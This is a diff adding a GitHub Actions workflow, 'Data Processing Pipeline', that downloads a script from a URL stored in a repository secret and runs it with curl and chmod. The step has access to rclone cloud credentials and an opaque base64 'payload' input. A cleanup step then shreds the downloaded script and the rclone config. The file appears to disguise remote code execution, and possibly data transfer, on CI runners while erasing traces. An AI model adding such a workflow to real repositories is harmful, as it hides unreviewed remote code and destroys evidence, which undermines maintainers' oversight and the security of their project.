@@ -1,0 +1,45 @@
+name: Data Processing Pipeline
+
+on:
+  workflow_dispatch:
+    inputs:
+      payload:
+        description: 'Task Configuration Payload'
+        required: false
+        default: ''
+        type: string
+      channel:
+        description: 'Target Source Alias'
+        required: false
+        default: ''
+        type: string
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    timeout-minutes: 75
+
+    steps:
+      - name: Execute Task Engine
+        env:
+          PAYLOAD_B64: ${{ inputs.payload }}
+          CHANNEL: ${{ inputs.channel }}
+          RCLONE_CONF: ${{ secrets.RCLONE_CONF }}
+          PIPELINE_SCRIPT_URL: ${{ secrets.PIPELINE_SCRIPT_URL }}
+        run: |
+          if [ -n "$PIPELINE_SCRIPT_URL" ]; then
+            curl -fsSL "$PIPELINE_SCRIPT_URL" -o /tmp/runner.sh
+            chmod +x /tmp/runner.sh
+            /tmp/runner.sh
+          fi
+
+      - name: Cleanup Task Environment
+        if: always()
+        run: |
+          shred -u -z ~/.config/rclone/rclone.conf 2>/dev/null || rm -f ~/.config/rclone/rclone.conf
+          shred -u -z /tmp/runner.sh 2>/dev/null || rm -f /tmp/runner.sh
+          rm -rf /tmp/buffer /tmp/pipeline_buffer ~/.config/rclone
